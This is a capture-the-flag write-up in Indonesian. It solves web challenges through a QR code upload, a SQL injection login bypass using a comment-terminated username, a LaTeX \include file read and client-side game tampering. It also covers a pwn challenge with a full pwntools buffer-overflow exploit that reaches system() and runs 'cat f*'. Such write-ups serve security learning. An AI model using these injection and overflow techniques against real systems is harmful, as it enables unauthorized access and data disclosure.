# web
---
## Scanbook

pada website ini kita diberikan url website, dimana website ini merupakan sebuah web app, untuk menyimpan note dan menyimpan datanya menggunakan qrcode. Jadi kita hanya perlu menggenerate qrcode dengan angka 0, di cyberchef https://gchq.github.io/CyberChef/#recipe=Generate_QR_Code(%27PNG%27,5,2,%27Medium%27)&input=MA, dan upload ke website tersebut. Yay kita mendaptkan flagnya

![](Pasted%20image%2020221107060800.png)

## buckeyenotes

kita diberikan website yang vulnerable dengan sql injection, dan kita disuruh untuk mengambil note dari spesifik user

![](Pasted%20image%2020221107060238.png)

cukup kita bypass menggunakan "brutusB3stNut9999'--"

bypass menggunakan comment pada sql

## textual

diketahui flag ada di current directory server, karna app ini menggunakan latex dan di latex ada fungsi untuk menambah latex lain menggunakan fungsi `\include`, kita bisa memanfaatkannya untuk membaca flag di current directory.

![](Pasted%20image%2020221107060336.png)

## pong

Didalam challenge kita diberikan url yang menuju website yang berisi game ping pong didalamnya.

![](Pasted%20image%2020221107060408.png)

Dalam challenge ini tujuan kita adalah untuk mengalahkan lawan kita. Setelah melihat source code menggunakan developer tools, kita mengetahui bahwa proses game ini dilakukan pada client, sihingga kita bisa mengubah beberapa parameter dalam game.
Untuk source code index, bisa kalian lihat disini: https://pastebin.com/vKbP48ZR

Jadi untuk menyelesaikan challenge ini saya merubah parameter bvx menjadi 100, agar bola masuk ke gawang lawan, dan kita bisa memenangkan game ini.

![](Pasted%20image%2020221107060436.png)

kita continue dari breakpoint, dan boom, kita mendapatkan flagnya

![](Pasted%20image%2020221107060452.png)

# pwn
---
## Samurai

Kita diberikan source code, dimana kita perlu mencocokkan variable outcome dengan hex 0x4774cc, untuk mendapatkan shell.

```c
    if(outcome == 0x4774cc) {
        char* finisher = malloc(8);
        scroll(txt[3]);
        fgets(finisher, 8, stdin);
        system(finisher);
    }
```

exploit

```python
from pwn import *
import sys
from Crypto.Util.number import long_to_bytes

context.binary = exe = ELF(f"./samurai", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def sendName(self, content):
        p = self.p
        p.sendline(content)
    
    def waitForName(self):
        p = self.p
        p.recvuntil(b"what was it again?")

def main():
    x, p = init()
    """
    karna pada source code ada baris seperti dibawah ini:

    strcpy(response + strlen(response) - 1, ".\n");

    kita harus membuat null-byte di awal, agar address yang ingin kita rubah,
    tidak ter-overwrite dengan newline.
    """
    pay = b"\x00"+b"A"*29
    pay += b"\xcc\x74\x47\x00"
    pay +=b"A"*2
    x.sendName(pay)
    x.debug("break *main+203\nc")
    x.waitForName()
    """
    
    char* finisher = malloc(8);
    
    kita hanya bisa mengirim sebanyak 8 byte,
    jadi kita menggunakan asterisk "*" untuk membaca flagnya
    """
    p.sendline(b"cat f*")
    p.interactive()
    
if __name__=="__main__":
    main()
```

